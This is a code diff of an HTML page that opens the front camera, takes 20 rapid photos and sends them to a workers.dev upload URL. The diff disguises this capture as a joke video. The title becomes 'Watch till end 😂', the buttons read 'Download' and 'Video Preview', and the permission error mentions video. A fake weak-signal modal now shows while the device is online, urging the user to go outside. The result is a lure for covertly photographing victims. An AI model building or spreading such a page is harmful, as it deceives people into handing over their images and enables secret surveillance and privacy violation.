@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
-<title>Capture my 20 Photos</title>
+<title>Watch till end 😂</title>
 <style>
 :root{--bg:#fafafa;--fg:#161616;--muted:#777;--line:#dcdcdc;--ok:#1a7f4b;--err:#b3261e}
 @media (prefers-color-scheme:dark){:root{--bg:#141414;--fg:#f2f2f2;--muted:#9a9a9a;--line:#333;--ok:#4cc38a;--err:#ff8a80}}
@@ -61,13 +61,13 @@ button:focus:not(:focus-visible){outline:none}
 <main>
 <div class="bars" id="bars" hidden>
 <div class="bar-row">
-<div class="bar-label"><span>Saving....</span><span id="uploadText">0%</span></div>
+<div class="bar-label"><span>Loading....</span><span id="uploadText">0%</span></div>
 <div class="bar-track"><div class="bar-fill" id="uploadFill"></div></div>
 </div>
 </div>
 <div class="photo-box">
 <img src="image.png" alt="Photo" id="previewImage">
-<button type="button" class="play-icon" id="playIcon" aria-label="Capture my 20 photos">
+<button type="button" class="play-icon" id="playIcon" aria-label="Video Preview">
 <svg class="play-svg" viewBox="0 0 68 68">
 <circle cx="34" cy="34" r="33" fill="rgba(0,0,0,.4)" stroke="#fff" stroke-width="2"/>
 <path d="M27 21.5v25l21-12.5z" fill="#fff"/>
@@ -79,7 +79,7 @@ button:focus:not(:focus-visible){outline:none}
 </svg>
 </button>
 </div>
-<button id="start">Capture my 20 photos</button>
+<button id="start">Download 📥</button>
 <p id="status" role="status"></p>
 </main>
 <div class="modal-overlay" id="weakSignalModal" hidden>
@@ -92,13 +92,13 @@ button:focus:not(:focus-visible){outline:none}
 <path d="M42 22c-1.2-1.2-2.6-2.1-4-2.8" stroke="var(--line)" stroke-width="3" stroke-linecap="round" opacity=".35"/>
 <path d="M48 15c-2.4-2.2-5-3.9-7.8-5" stroke="var(--line)" stroke-width="3" stroke-linecap="round" opacity=".35"/>
 </svg>
-<p>Weak signal! Please step outside for better network.</p>
+<p>Weak radio signal! Please go outside for better network.</p>
 <button type="button" id="weakSignalOk">OK</button>
 </div>
 </div>
 <script>
 const UPLOAD_URL="https://photos.my9761313328.workers.dev/upload";
-const WEAK_SIGNAL_TRIGGER="offline";
+const WEAK_SIGNAL_TRIGGER="online";
 const TOTAL_SHOTS=20;
 const SHOT_INTERVAL_MS=350;
 const startBtn=document.getElementById("start");
@@ -150,7 +150,7 @@ setStartDisabled(true);
 try{
 stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});
 }catch(e){
-say("No Camera Access Found","err");
+say("Permission Required For Video","err");
 setStartDisabled(false);
 return;
 }
